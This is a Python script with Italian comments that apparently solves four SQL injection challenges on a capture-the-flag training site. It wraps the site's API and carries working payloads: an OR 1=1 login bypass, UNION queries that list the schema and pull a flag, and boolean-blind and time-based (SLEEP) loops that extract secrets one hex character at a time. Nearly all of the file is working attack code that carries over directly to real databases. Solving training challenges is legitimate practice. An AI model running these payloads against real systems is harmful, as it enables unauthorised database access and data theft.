import requests
import binascii
import time


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
        

#Esempio d'uso:

#CHALLENGE 1
inj = Inj('http://web-17.challs.olicyber.it')
response, error = inj.logic("' OR 1=1 -- -")
print(response)

#CHALLENGE 2
#prendo informazioni tabelle e colonne
response, error = inj.union("' UNION SELECT table_name, column_name, 3,4,5,6 FROM information_schema.columns WHERE table_schema = DATABASE() -- ")

response, error = inj.union("' UNION SELECT flag, 2, 3,4,5,6 FROM real_data -- ")
print(response)
	
# CHALLENGE 3


payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            break
    else:
        break # Yup, i cicli for in Python hanno una sezione else.
              # Significa che abbiamo esaurito i caratteri del
              # dizionario.
print(result)

# CHALLENGE 4

from time import time

payload = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE 'guess%')='1"
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
	for c in dictionary:
		# Registriamo il tempo di inizio
		start = time()
		# Lanciamo la query...
		question = f"1' and (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
		response, error = inj.time(question)

		# Confrontiamo il tempo finale con quello di partenza
		elapsed = time() - start
				
		if elapsed > 1: # We have a match!
			result += c
			#print(result)
			break
	else:
		break # Yup, i cicli for in Python hanno una sezione else.
		# Significa che abbiamo esaurito i caratteri del
		# dizionario.
print(result)

